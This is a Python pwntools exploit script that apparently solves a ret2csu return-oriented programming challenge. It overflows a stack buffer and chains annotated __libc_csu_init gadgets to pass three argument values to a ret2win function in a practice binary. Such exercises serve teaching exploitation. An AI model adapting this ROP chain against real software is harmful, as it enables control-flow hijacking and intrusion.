from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()

context.binary = elf = ELF('./ret2csu')
#libc = elf.libc
start()

payload = b'A'  * 40

dum_func = p64(0x0600E48)
pop_reg = p64(0x40069A) 
#                                                      pop     rbx
# .text:000000000040069B 5D                            pop     rbp
# .text:000000000040069C 41 5C                         pop     r12
# .text:000000000040069E 41 5D                         pop     r13
# .text:00000000004006A0 41 5E                         pop     r14
# .text:00000000004006A2 41 5F                         pop     r15
# .text:00000000004006A4 C3                            retn
modify_rdx = p64(0x400680)
#    loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
# .text:0000000000400680 4C 89 FA                      mov     rdx, r15
# .text:0000000000400683 4C 89 F6                      mov     rsi, r14
# .text:0000000000400686 44 89 EF                      mov     edi, r13d
# .text:0000000000400689 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]
# .text:0000000000400689
# .text:000000000040068D 48 83 C3 01                   add     rbx, 1
# .text:0000000000400691 48 39 DD                      cmp     rbp, rbx
# .text:0000000000400694 75 EA                         jnz     short loc_400680
# .text:0000000000400694
# .text:0000000000400696
# .text:0000000000400696                               loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
# .text:0000000000400696 48 83 C4 08                   add     rsp, 8
# .text:000000000040069A 5B                            pop     rbx
# .text:000000000040069B 5D                            pop     rbp
# .text:000000000040069C 41 5C                         pop     r12
# .text:000000000040069E 41 5D                         pop     r13
# .text:00000000004006A0 41 5E                         pop     r14
# .text:00000000004006A2 41 5F                         pop     r15
# .text:00000000004006A4 C3                            retn
# .text:00000000004006A4                               ; } // starts at 400640
pop_rdi = p64(0x00000000004006a3)
ret2win = p64(0x400510)

payload += pop_reg
payload += p64(0)
payload += p64(1)
payload += dum_func
payload += p64(0)
payload += p64(0xCAFEBABECAFEBABE)
payload += p64(0xD00DF00DD00DF00D)
payload += modify_rdx
payload += p64(0) * 7
payload += pop_rdi
payload += p64(0xDEADBEEFDEADBEEF)
payload += ret2win



with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

chall.recvuntil(b'> ')
chall.sendline(payload)
t = chall.recvall(timeout = 0.2)
print(t)